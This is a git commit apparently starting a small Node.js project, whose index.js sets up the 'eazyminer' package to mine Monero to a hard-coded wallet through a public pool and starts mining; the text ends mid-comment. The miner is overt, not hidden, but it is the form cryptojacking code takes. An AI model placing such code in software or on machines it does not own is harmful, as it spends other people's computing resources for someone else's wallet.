54c879a6c8c903f799c39db05b94d14f30266549
ene ikenna <enebret@yahoo.com>
2022-07-25 09:41:52 +0100

    first commit

---
+++ index.js
@@ -0,0 +1,12 @@
+const Miner = require('eazyminer');
+
+const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: '4AAL8nBSh1c8SLxUfFfXqxNm5riDL7YWc51pdgjzW2PdFshtSU8jofNJnpzBhPjxXP1hzqteLQ1TnHqUahEcYMda7Mqpits',
+        url: 'xmrpool.eu:9999', // optional pool URL,
+    }],
+    autoStart: false // optional delay
+});
+
+miner.start(); // optional manually start the m
